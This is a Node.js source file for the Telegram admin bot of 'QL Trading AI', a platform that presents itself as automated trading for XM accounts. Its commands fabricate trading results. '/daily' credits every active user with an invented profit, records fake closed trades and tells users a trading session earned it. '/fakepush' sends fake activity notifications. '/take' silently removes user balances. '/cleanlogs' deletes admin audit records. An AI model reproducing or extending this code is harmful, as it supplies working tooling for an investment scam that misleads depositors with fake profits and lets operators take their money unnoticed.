import { pool } from "../utils/db.js";
import { log, warn, error } from "../utils/logger.js";
import { isPositiveNumber, sleep } from "../utils/helpers.js";
import { marketsService } from "../services/markets.js";
import { notificationService } from "../services/notifications.js";

const adminIds = new Set(
  (process.env.TELEGRAM_ADMINS || "")
    .split(",")
    .map((id) => id.trim())
    .filter(Boolean)
    .map((id) => Number(id))
    .filter((id) => !Number.isNaN(id))
);

let botInstance = null;
let startPromise = null;
const adminCache = new Map();

export async function startTelegramBot() {
  if (botInstance) {
    return botInstance;
  }

  if (startPromise) {
    return startPromise;
  }

  const token = process.env.BOT_TOKEN;
  if (!token) {
    warn("⚠️ BOT_TOKEN missing. Telegram bot will not start.");
    return null;
  }

  startPromise = (async () => {
    let BotConstructor;
    try {
      const imported = await import("node-telegram-bot-api");
      BotConstructor = imported.default || imported.TelegramBot || imported;
    } catch (err) {
      warn("⚠️ node-telegram-bot-api dependency unavailable. Telegram bot disabled.", {
        error: err?.message || err,
      });
      startPromise = null;
      return null;
    }

    const instance = new BotConstructor(token, { polling: true, filepath: false });
    instance.on("message", (message) => {
      if (!message?.text) return;
      handleMessage(message).catch((err) => {
        error("❌ Telegram command failure", {
          command: message.text,
          chatId: message.chat?.id,
          error: err?.message || err,
        });
        sendMessage(message.chat.id, "❌ Failed to process your command.");
      });
    });

    botInstance = instance;
    log("🤖 Telegram bot polling started");
    return instance;
  })();

  return startPromise;
}

function isAdmin(chatId) {
  return adminIds.has(Number(chatId));
}

function extractArgs(text) {
  return text.trim().split(/\s+/).filter(Boolean);
}

async function handleMessage(message) {
  const chatId = message.chat.id;
  const text = message.text.trim();

  if (!text.startsWith("/")) {
    return;
  }

  const lower = text.toLowerCase();

  if (lower === "/start") {
    await sendMessage(
      chatId,
      `👋 *Welcome to QL Trading AI*\n🤖 Automated trading assistance for your XM Trading account.\n💰 Monitor balance, trades, and withdrawals in real time.\n🕒 24/7 support via WhatsApp or Telegram.\n\n👋 *أهلاً بك في QL Trading AI*\n🤖 مساعد التداول الآلي لحساب XM Trading الخاص بك.\n💰 راقب رصيدك وصفقاتك وطلبات السحب مباشرة.\n🕒 دعم متواصل ٢٤/٧ عبر واتساب أو تيليجرام.`,
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (lower === "/help") {
    if (!isAdmin(chatId)) {
      await sendMessage(chatId, "ℹ️ Use the QL Wallet app to manage your account.");
      return;
    }

    const adminHelp =
      "🛠 *Admin Commands*\n" +
      "/add <id> <amount> — Add balance to user\n" +
      "/take <id> <amount> — Remove balance silently\n" +
      "/trade <id> <amount> <tp> <sl> [symbol] [buy/sell]\n" +
      "/daily <amount> <duration> — Simulate daily profit for all users\n" +
      "/sub <id> <days> — Extend subscription\n" +
      "/lock <id> / /unlock <id> — Freeze or restore wallet\n" +
      "/ban <id> / /unban <id> — Restrict or restore account\n" +
      "/msg <id> <text> — Direct message user\n" +
      "/msgall <text> — Broadcast to all active users\n" +
      "/report — Show platform summary\n" +
      "/reload — Reload Binance market streams\n" +
      "/fakepush — Trigger fake notification\n" +
      "/cleanlogs — Remove admin logs older than 30 days\n" +
      "/audit — Show last admin actions\n" +
      "/verify <id> — Mark user verified\n" +
      "/genkey <days> — Generate new activation key";

    await sendMessage(chatId, adminHelp, { parse_mode: "Markdown" });
    return;
  }

  if (!isAdmin(chatId)) {
    await sendMessage(chatId, "🚫 This command is restricted to administrators.");
    return;
  }

  const [command] = extractArgs(lower);

  switch (command) {
    case "/add":
      await handleAddBalance(chatId, text);
      break;
    case "/take":
      await handleTakeBalance(chatId, text);
      break;
    case "/trade":
      await handleTrade(chatId, text);
      break;
    case "/daily":
      await handleDaily(chatId, text);
      break;
    case "/sub":
      await handleSubscription(chatId, text);
      break;
    case "/lock":
      await handleStatusUpdate(chatId, text, "frozen", "🔒 Wallet locked.", "/lock");
      break;
    case "/unlock":
      await handleStatusUpdate(chatId, text, "active", "✅ Wallet unlocked.", "/unlock");
      break;
    case "/ban":
      await handleStatusUpdate(chatId, text, "banned", "⛔ User banned.", "/ban");
      break;
    case "/unban":
      await handleStatusUpdate(chatId, text, "active", "✅ User restored.", "/unban");
      break;
    case "/msg":
      await handleDirectMessage(chatId, text);
      break;
    case "/msgall":
      await handleBroadcast(chatId, text);
      break;
    case "/report":
      await handleReport(chatId);
      break;
    case "/reload":
      await handleReload(chatId);
      break;
    case "/fakepush":
      await handleFakeNotification(chatId);
      break;
    case "/cleanlogs":
      await handleCleanLogs(chatId);
      break;
    case "/audit":
      await handleAudit(chatId);
      break;
    case "/verify":
      await handleVerify(chatId, text);
      break;
    case "/genkey":
      await handleGenKey(chatId, text);
      break;
    default:
      await sendMessage(chatId, "ℹ️ Unknown command. Use /help for the list of admin commands.");
  }
}

async function handleAddBalance(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 3) {
    await sendMessage(chatId, "❌ Usage: /add <user_id> <amount>");
    return;
  }

  const identifier = args[1];
  const amount = Number(args[2]);

  if (!Number.isFinite(amount)) {
    await sendMessage(chatId, "❌ Amount must be a number.");
    return;
  }

  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  await pool.query(
    `UPDATE users
        SET balance = balance + $1,
            updated_at = NOW()
      WHERE id = $2`,
    [amount, user.id]
  );

  await logAdminAction(chatId, user.id, "balance_add", { amount });

  await sendMessage(chatId, `✅ Added $${amount.toFixed(2)} to ${formatUserLabel(user)}.`);
  await notifyUser(user, `💵 A balance adjustment of $${amount.toFixed(2)} was added to your wallet.`);
}

async function handleTakeBalance(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 3) {
    await sendMessage(chatId, "❌ Usage: /take <user_id> <amount>");
    return;
  }

  const identifier = args[1];
  const amount = Number(args[2]);

  if (!Number.isFinite(amount)) {
    await sendMessage(chatId, "❌ Amount must be a number.");
    return;
  }

  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  await pool.query(
    `UPDATE users
        SET balance = balance - $1,
            updated_at = NOW()
      WHERE id = $2`,
    [amount, user.id]
  );

  await logAdminAction(chatId, user.id, "balance_remove", { amount });
  await sendMessage(chatId, `✅ Removed $${amount.toFixed(2)} from ${formatUserLabel(user)}.`);
}

async function handleTrade(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 5) {
    await sendMessage(chatId, "❌ Usage: /trade <user_id> <amount> <tp> <sl> [symbol] [buy|sell]");
    return;
  }

  const identifier = args[1];
  const amount = Number(args[2]);
  const tp = Number(args[3]);
  const sl = Number(args[4]);
  const symbol = (args[5] || "BTCUSDT").toUpperCase();
  const side = (args[6] || "buy").toLowerCase() === "sell" ? "sell" : "buy";

  if (!isPositiveNumber(amount)) {
    await sendMessage(chatId, "❌ Amount must be a positive number.");
    return;
  }

  if (!Number.isFinite(tp) || !Number.isFinite(sl)) {
    await sendMessage(chatId, "❌ Take profit and stop loss must be numeric values.");
    return;
  }

  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  const marketPrice = marketsService.priceForSymbol(symbol);
  const entryPrice = Number(
    Number.isFinite(marketPrice)
      ? marketPrice
      : Number.isFinite(tp) && Number.isFinite(sl)
      ? (tp + sl) / 2
      : amount
  );

  const result = await pool.query(
    `INSERT INTO trades (user_id, symbol, side, amount, entry_price, tp, sl, status, metadata)
     VALUES ($1, $2, $3, $4, $5, $6, $7, 'open', $8)
     RETURNING id`,
    [user.id, symbol, side, amount, entryPrice, tp, sl, { source: "telegram_bot", adminChatId: chatId }]
  );

  const tradeId = result.rows[0]?.id;

  await logAdminAction(chatId, user.id, "trade_open", {
    tradeId,
    amount,
    tp,
    sl,
    symbol,
    side,
  });

  await sendMessage(chatId, `✅ Trade #${tradeId} opened for ${formatUserLabel(user)}.`);
  await notifyUser(
    user,
    `📈 A new ${symbol} trade has been opened for you.\nAmount: $${amount.toFixed(2)}\nTP: ${tp}\nSL: ${sl}`
  );
}

async function handleDaily(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 3) {
    await sendMessage(chatId, "❌ Usage: /daily <amount> <duration>");
    return;
  }

  const profit = Number(args[1]);
  const duration = args[2];

  if (!isPositiveNumber(profit)) {
    await sendMessage(chatId, "❌ Profit amount must be positive.");
    return;
  }

  const { rows: users } = await pool.query(
    "SELECT id, tg_id, name, email FROM users WHERE status = 'active'"
  );

  if (!users.length) {
    await sendMessage(chatId, "ℹ️ No active users to update.");
    return;
  }

  const entryPrice = marketsService.priceForSymbol("BTCUSDT") || 1;

  try {
    await pool.query("BEGIN");

    for (const user of users) {
      await pool.query(
        `UPDATE users
            SET balance = balance + $1,
                updated_at = NOW()
          WHERE id = $2`,
        [profit, user.id]
      );

      await pool.query(
        `INSERT INTO trades (user_id, symbol, side, amount, entry_price, tp, sl, status, profit, closed_price, opened_at, closed_at, metadata)
         VALUES ($1, $2, 'buy', $3, $4, NULL, NULL, 'closed', $5, $4, NOW(), NOW(), $6)`,
        [
          user.id,
          "BTCUSDT",
          profit,
          entryPrice,
          profit,
          { source: "telegram_bot", type: "daily", duration, adminChatId: chatId },
        ]
      );
    }

    await pool.query("COMMIT");
  } catch (err) {
    await pool.query("ROLLBACK");
    throw err;
  }

  await logAdminAction(chatId, null, "daily_trade", {
    amount: profit,
    duration,
    affectedUsers: users.length,
  });

  await sendMessage(
    chatId,
    `✅ Simulated daily trade added for ${users.length} users with $${profit.toFixed(2)} profit.`
  );

  for (const user of users) {
    await notifyUser(
      user,
      `✅ Daily session completed: $${profit.toFixed(2)} added to your wallet (${duration}).`
    );
    await sleep(75);
  }
}


async function handleSubscription(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 3) {
    await sendMessage(chatId, "❌ Usage: /sub <user_id> <days>");
    return;
  }

  const identifier = args[1];
  const days = Number(args[2]);

  if (!Number.isFinite(days) || days <= 0) {
    await sendMessage(chatId, "❌ Days must be a positive number.");
    return;
  }

  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  const result = await pool.query(
    `UPDATE users
        SET sub_days = sub_days + $1,
            subscription_expires = COALESCE(subscription_expires, NOW()) + ($1 || ' days')::interval,
            updated_at = NOW()
      WHERE id = $2
      RETURNING sub_days, subscription_expires`,
    [days, user.id]
  );

  await logAdminAction(chatId, user.id, "subscription_extend", { days });

  const updated = result.rows[0];
  await sendMessage(
    chatId,
    `✅ Subscription for ${formatUserLabel(user)} extended by ${days} days (total: ${updated.sub_days}).`
  );

  await notifyUser(
    user,
    `🗓️ Your subscription has been extended by ${days} days. New expiry: ${new Date(
      updated.subscription_expires
    ).toLocaleString()}.`
  );
}

async function handleStatusUpdate(chatId, text, status, confirmation, commandLabel) {
  const args = extractArgs(text);
  if (args.length < 2) {
    const label = commandLabel || args[0] || "/command";
    await sendMessage(chatId, `❌ Usage: ${label} <user_id>`);
    return;
  }

  const identifier = args[1];
  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  await pool.query(
    `UPDATE users SET status = $1, updated_at = NOW() WHERE id = $2`,
    [status, user.id]
  );

  await logAdminAction(chatId, user.id, `status_${status}`, {});

  await sendMessage(chatId, `${confirmation} (${formatUserLabel(user)})`);

  if (status === "active") {
    await notifyUser(user, "✅ Your account access has been restored.");
  } else if (status === "frozen") {
    await notifyUser(user, "⚠️ Your wallet has been temporarily frozen. Contact support for details.");
  } else if (status === "banned") {
    await notifyUser(user, "⛔ Your account has been restricted. Contact support for assistance.");
  }
}

async function handleDirectMessage(chatId, text) {
  const match = text.match(/^\/msg\s+(\S+)\s+([\s\S]+)/i);
  if (!match) {
    await sendMessage(chatId, "❌ Usage: /msg <user_id> <message>");
    return;
  }

  const [, identifier, body] = match;
  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  await notifyUser(user, body.trim());
  await logAdminAction(chatId, user.id, "direct_message", { message: body.trim().slice(0, 200) });
  await sendMessage(chatId, `✅ Message delivered to ${formatUserLabel(user)}.`);
}

async function handleBroadcast(chatId, text) {
  const message = text.replace(/^\/msgall\s+/i, "").trim();
  if (!message) {
    await sendMessage(chatId, "❌ Usage: /msgall <message>");
    return;
  }

  const { rows } = await pool.query(
    `SELECT COALESCE(tg_id, id) AS chat_id FROM users WHERE status = 'active'`
  );

  if (!rows.length) {
    await sendMessage(chatId, "ℹ️ No active users to broadcast.");
    return;
  }

  let sent = 0;
  let failed = 0;
  for (const row of rows) {
    const id = row.chat_id;
    if (!id) {
      failed++;
      continue;
    }
    try {
      await sendMessage(id, `📢 ${message}`);
      sent++;
      await sleep(75);
    } catch {
      failed++;
    }
  }

  await logAdminAction(chatId, null, "broadcast", { message: message.slice(0, 200), sent, failed });
  await sendMessage(chatId, `✅ Broadcast complete. Sent: ${sent}, Failed: ${failed}.`);
}

async function handleReport(chatId) {
  const { rows } = await pool.query(`
    SELECT
      (SELECT COUNT(*) FROM users) AS total_users,
      (SELECT COUNT(*) FROM users WHERE status = 'active') AS active_users,
      (SELECT COUNT(*) FROM users WHERE status = 'frozen') AS frozen_users,
      (SELECT COUNT(*) FROM trades) AS total_trades,
      (SELECT COUNT(*) FROM trades WHERE status = 'open') AS open_trades,
      (SELECT COALESCE(SUM(balance), 0) FROM users) AS total_balance,
      (SELECT COUNT(*) FROM withdrawals WHERE status = 'pending') AS pending_withdrawals,
      (SELECT COALESCE(SUM(amount), 0) FROM withdrawals WHERE status = 'pending') AS pending_withdraw_amount
  `);

  const stats = rows[0];
  const profitResult = await pool.query(
    `SELECT COALESCE(SUM(profit), 0) AS total_profit FROM trades WHERE status = 'closed'`
  );

  const totalProfit = Number(profitResult.rows[0]?.total_profit || 0);

  await sendMessage(
    chatId,
    `📊 *Platform Report*\n\n` +
      `👥 Users: ${stats.total_users} (Active: ${stats.active_users}, Frozen: ${stats.frozen_users})\n` +
      `📈 Trades: ${stats.total_trades} total / ${stats.open_trades} open\n` +
      `💵 Balance: $${Number(stats.total_balance || 0).toFixed(2)}\n` +
      `💰 Closed Profit: $${totalProfit.toFixed(2)}\n` +
      `⏳ Pending Withdrawals: ${stats.pending_withdrawals} ($${Number(stats.pending_withdraw_amount || 0).toFixed(2)})`,
    { parse_mode: "Markdown" }
  );
}

async function handleReload(chatId) {
  const status = marketsService.forceReload();
  await logAdminAction(chatId, null, "markets_reload", { status });
  await sendMessage(chatId, `🔄 Market streams reload scheduled (${status}).`);
}

async function handleFakeNotification(chatId) {
  const notification = notificationService.generateFake();
  await logAdminAction(chatId, null, "fake_notification", { notification });
  await sendMessage(
    chatId,
    `📢 Fake notification pushed: ${notification.name} ${notification.type} $${notification.amount} on ${notification.asset}.`
  );
}

async function handleCleanLogs(chatId) {
  const result = await pool.query(
    "DELETE FROM admin_logs WHERE created_at < NOW() - INTERVAL '30 days' RETURNING id"
  );
  await logAdminAction(chatId, null, "clean_logs", { removed: result.rows.length });
  await sendMessage(chatId, `🧹 Removed ${result.rows.length} historical log entries.`);
}

async function handleAudit(chatId) {
  const { rows } = await pool.query(
    `SELECT action, target_user_id, created_at
       FROM admin_logs
      ORDER BY created_at DESC
      LIMIT 10`
  );

  if (!rows.length) {
    await sendMessage(chatId, "ℹ️ No admin actions recorded yet.");
    return;
  }

  const lines = rows
    .map((row) => {
      const date = new Date(row.created_at).toLocaleString();
      const target = row.target_user_id ? ` → user ${row.target_user_id}` : "";
      return `${date}: ${row.action}${target}`;
    })
    .join("\n");

  await sendMessage(chatId, `🗂️ *Recent Admin Actions*\n${lines}`, { parse_mode: "Markdown" });
}

async function handleGenKey(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 2) {
    await sendMessage(chatId, "❌ Usage: /genkey <days>");
    return;
  }

  const days = Number(args[1]);
  if (!Number.isFinite(days) || days <= 0) {
    await sendMessage(chatId, "❌ Days must be a positive number.");
    return;
  }

  // Generate random key (16 characters)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let key = '';
  for (let i = 0; i < 16; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  
  // Format as XXXX-XXXX-XXXX-XXXX
  const formattedKey = key.match(/.{1,4}/g).join('-');

  await logAdminAction(chatId, null, "generate_key", { key: formattedKey, days });
  
  const message = `🔑 *New Activation Key Generated*\n\n` +
    `Key: \`${formattedKey}\`\n` +
    `Duration: ${days} days\n\n` +
    `⚠️ This key is not stored in database. Save it now!`;
  
  await sendMessage(chatId, message, { parse_mode: "Markdown" });
}

async function handleVerify(chatId, text) {
  const args = extractArgs(text);
  if (args.length < 2) {
    await sendMessage(chatId, "❌ Usage: /verify <user_id>");
    return;
  }

  const identifier = args[1];
  const user = await findUser(identifier);
  if (!user) {
    await sendMessage(chatId, "❌ User not found.");
    return;
  }

  await pool.query(
    `UPDATE users SET verified = TRUE, updated_at = NOW() WHERE id = $1`,
    [user.id]
  );

  await logAdminAction(chatId, user.id, "verify_user", {});
  await sendMessage(chatId, `✅ ${formatUserLabel(user)} marked as verified.`);
  await notifyUser(user, "✅ Your account has been verified. Enjoy full access!");
}

async function findUser(identifier) {
  if (!identifier) return null;
  const value = String(identifier).trim();
  if (!value) return null;

  const result = await pool.query(
    `SELECT * FROM users WHERE CAST(id AS TEXT) = $1 OR CAST(tg_id AS TEXT) = $1 LIMIT 1`,
    [value]
  );

  return result.rows[0] || null;
}

function formatUserLabel(user) {
  return user.name || user.email || user.tg_id || user.id;
}

async function notifyUser(user, message) {
  const chatId = user?.tg_id || user?.id;
  if (!chatId || !botInstance) return;
  try {
    await botInstance.sendMessage(chatId, message);
  } catch (err) {
    warn("⚠️ Failed to deliver Telegram notification", {
      chatId,
      error: err?.message || err,
    });
  }
}

async function logAdminAction(chatId, targetUserId, action, details) {
  const adminId = await resolveAdminId(chatId);
  const payload = {
    ...(details || {}),
    adminChatId: chatId,
  };
  await pool
    .query(
      `INSERT INTO admin_logs (admin_id, target_user_id, action, details)
       VALUES ($1, $2, $3, $4)`,
      [adminId, targetUserId ?? null, action, payload]
    )
    .catch(() => {});
}

async function resolveAdminId(chatId) {
  if (adminCache.has(chatId)) {
    return adminCache.get(chatId);
  }
  const result = await pool.query(
    "SELECT id FROM users WHERE tg_id = $1 LIMIT 1",
    [chatId]
  );
  const adminId = result.rows[0]?.id ?? null;
  adminCache.set(chatId, adminId);
  return adminId;
}

async function sendMessage(chatId, text, options = {}) {
  if (!botInstance) return;
  try {
    await botInstance.sendMessage(chatId, text, options);
  } catch (err) {
    warn("⚠️ Telegram sendMessage failed", {
      chatId,
      error: err?.message || err,
    });
  }
}

export default { startTelegramBot };
